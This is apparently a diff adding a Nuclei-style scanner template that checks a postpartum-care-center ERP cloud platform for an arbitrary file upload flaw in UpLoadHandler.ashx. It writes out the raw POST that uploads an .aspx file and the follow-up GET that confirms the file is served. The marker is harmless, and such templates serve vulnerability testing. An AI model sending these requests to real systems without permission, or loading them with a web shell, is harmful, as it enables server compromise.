@@ -1,0 +1,47 @@
+id: yuezihuisuo-ERP-UpLoadHandler-upload
+
+info:
+  name: 月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞
+  author: yuezihuisuo
+  severity: high
+  tags: yuezihuisuo
+
+http:
+  - raw:
+      - |
+        POST /Page/BasicInfo/ashx/UpLoadHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWPL35TV23dfr1cNr
+
+        ------WebKitFormBoundaryWPL35TV23dfr1cNr
+        Content-Disposition: form-data; name="file"; filename="t.aspx"
+        
+        {{randstr}}
+        ------WebKitFormBoundaryWPL35TV23dfr1cNr--
+
+      - |+
+        GET /UploadBaseFolder/Contact/{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '(\d+\.aspx)'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
